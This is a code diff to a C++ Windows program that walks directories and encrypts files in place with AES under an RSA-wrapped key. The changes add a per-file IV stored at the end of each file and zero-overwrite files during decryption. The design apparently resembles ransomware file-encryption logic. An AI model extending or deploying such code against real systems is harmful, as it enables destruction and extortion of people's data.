@@ -197,6 +197,8 @@ boolean rsa_encrypt(std::vector<BYTE>& key, std::vector<BYTE>& newKey) {
 boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector<BYTE> iv, std::vector<BYTE>& key, DWORD& keyObjLen) {
 	NTSTATUS status = NULL;
 	BCRYPT_KEY_HANDLE hKey = NULL;
+	std::vector<BYTE> ivc(16);
+	ivc = iv;
 
 	HANDLE hFile = CreateFileW(
 		filepath,
@@ -283,8 +285,9 @@ boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector
 	}
 
 	DWORD bytesWritten;
+	ciphertext.insert(ciphertext.end(), ivc.begin(), ivc.end());
 	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-	if (!WriteFile(hFile, ciphertext.data(), encryptedSize, &bytesWritten, NULL)) {
+	if (!WriteFile(hFile, ciphertext.data(), encryptedSize + ivc.size(), &bytesWritten, NULL)) {
 		CloseHandle(hFile);
 		return false;
 	}
@@ -318,7 +321,7 @@ boolean aes_decrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector
 		return false;
 	}
 
-	std::vector<BYTE> ciphertext((size_t)actualSize.QuadPart);
+	std::vector<BYTE> ciphertext((size_t)actualSize.QuadPart - 16);
 	DWORD bytesRead;
 	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 	if (!ReadFile(hFile, ciphertext.data(), (DWORD)ciphertext.size(), &bytesRead, NULL)) {
@@ -380,6 +383,14 @@ boolean aes_decrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector
 	}
 
 	DWORD bytesWritten;
+	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+	std::vector<BYTE> zeros(actualSize.QuadPart, 0);
+	if (!WriteFile(hFile, zeros.data(), (DWORD)zeros.size(), &bytesWritten, NULL)) {
+		CloseHandle(hFile);
+		return false;
+	}
+	FlushFileBuffers(hFile);
+
 	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 	if (!WriteFile(hFile, plaintext.data(), decryptedSize, &bytesWritten, NULL)) {
 		CloseHandle(hFile);
@@ -445,8 +456,30 @@ boolean traverse_dir(int dir_size, const wchar_t* dir, BCRYPT_ALG_HANDLE& hAlgor
 					FindClose(hFind);
 					return false;
 				}
+				
+				if (!gen_rand(iv)) return false;
 			}
 			else if (!encrypt && process_file) {
+				HANDLE hFile = CreateFileW(
+					filePath,
+					GENERIC_READ | GENERIC_WRITE,
+					0,
+					NULL,
+					OPEN_EXISTING,
+					FILE_ATTRIBUTE_NORMAL,
+					NULL
+				);
+				if (hFile == INVALID_HANDLE_VALUE) {
+					return false;
+				}
+
+				DWORD bytesRead;
+				SetFilePointer(hFile, filesize.QuadPart - 16, NULL, FILE_BEGIN);
+				if (!ReadFile(hFile, iv.data(), (DWORD)iv.size(), &bytesRead, NULL)) {
+					CloseHandle(hFile);
+					return false;
+				}
+				CloseHandle(hFile);
 				_tprintf(TEXT("Decrypting file: %s\n"), filePath);
 
 				if (!aes_decrypt(filePath, hAlgorithm, iv, key, keyObjLen)) {
